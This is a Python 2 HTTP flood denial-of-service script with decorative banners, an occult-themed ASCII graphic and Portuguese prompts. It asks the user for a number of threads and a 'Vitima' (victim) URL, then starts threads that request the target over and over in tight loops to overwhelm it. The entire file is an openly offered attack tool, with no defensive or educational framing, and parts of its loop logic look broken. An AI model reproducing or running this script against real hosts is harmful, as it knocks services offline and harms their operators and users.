#/usr/bin/Python
# -*- coding: utf-8 -*-
import sys
import time
import threading
import urllib
import os
from time import sleep
# colors
BLACK = "\033[1;30m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE = "\033[1;94m"
YELLOW = "\033[1;33m"
CIANO = "\033[1;36m"
LIGHT_GREEN = "\033[1;92m"
WHITE = "\033[1;97m"
MAGENTA = "\033[1;35m"
LIGHT_RED = "\033[1;91m"
GREY = "\033[1;37m"
RESET = "\033[0;0m" 

print (LIGHT_GREEN + """

███            ▄█    █▄       ▄████████         ▄██████▄   ▄██████▄  ████████▄     ▄████████ 
▀█████████▄   ███    ███     ███    ███        ███    ███ ███    ███ ███   ▀███   ███    ███ 
   ▀███▀▀██   ███    ███     ███    █▀         ███    █▀  ███    ███ ███    ███   ███    █▀  
    ███   ▀  ▄███▄▄▄▄███▄▄  ▄███▄▄▄           ▄███        ███    ███ ███    ███   ███        
    ███     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀          ▀▀███ ████▄  ███    ███ ███    ███ ▀███████████ 
    ███       ███    ███     ███    █▄         ███    ███ ███    ███ ███    ███          ███ 
    ███       ███    ███     ███    ███        ███    ███ ███    ███ ███   ▄███    ▄█    ███ 
   ▄████▀     ███    █▀      ██████████        ████████▀   ▀██████▀  ████████▀   ▄████████▀  
                                                                                             
""")
sleep(3)
os.system(['clear', 'cls'][os.name == 'nt'])

print (RED + """
______              
       .d$$$******$$$$c.        
    .d$P"            "$$c      
   $$$$$.           .$$$*$.            The real ones I have kept.
 .$$ 4$L*$$.     .$$Pd$  '$b           
 $F   *$. "$$e.e$$" 4$F   ^$b           https://github.com/march0s1as
d$     $$   z$$$e   $$     '$.          https://github.com/Gl4sya
$P     `$L$$P` `"$$d$"      $$          https://github.com/Slayyer-dev
$$     e$$F       4$$b.     $$ 
$b  .$$" $$      .$$ "4$b.  $$ 
$$e$P"    $b     d$`    "$$c$F                  I command you to come to me in peace, without delay,
'$P$$$$$$$$$$$$$$$$$$$$$$$$$$                               and satisfy my wishes.
 "$c.      4$.  $$       .$$   
  ^$$.      $$ d$"      d$P    
    "$$c.   `$b$F    .d$P"     
      `4$$$c.$$$..e$$P"        
          `^^^^^^^`
""")
sleep(5)
os.system(['clear', 'cls'][os.name == 'nt'])
a=1
b=threading.Lock()
 
class dos(threading.Thread):
    def __init__(self, host, threads):
        threading.Thread.__init__(self)
        self.host = host
        self.threads = threads
    def run(self):
        global a
        global b
        b.acquire()
        print RED +"\n                           The Gods pwned :D . -> {0}".format(self.threads)
        b.release()
        while 1 == a:
            try:
                urllib.urlopen(self.host).read
                try:
                    urllib.urlopen(self.host).read
                except:
                    pass
            except:
                pass
        b.acquire()
        print GREEN + "                          The Gods. {0}\n".format(self.threads)
        b.release()
        sys.exit()
try:
    threads=input(GREEN + "Quantos pacotes deseja's enviar: : ")
except NameError:
    sys.exit()
while True:
    host=raw_input(RED + "\n Vitima ===> ")
    print RED + "\n                The Gods. \n"
    time.sleep(2)
    try:
        urllib.urlopen(host)
    except IOError:
        print GREEN + "\nEspere um momento\n"
        sys.exit()
    else:
        break
print "\n"*2500
c=raw_input("         Deseja iniciar o attack ? ( Y/N ) > ")
if c=="Y":
    pass
elif c=="N":
    print RED + "\n                           The Gods pwned :D .\n"
    sys.exit()
for A in xrange(threads):
    dos(host, A+1).start()
a=0
print RED + "                    The Gods.   \n"
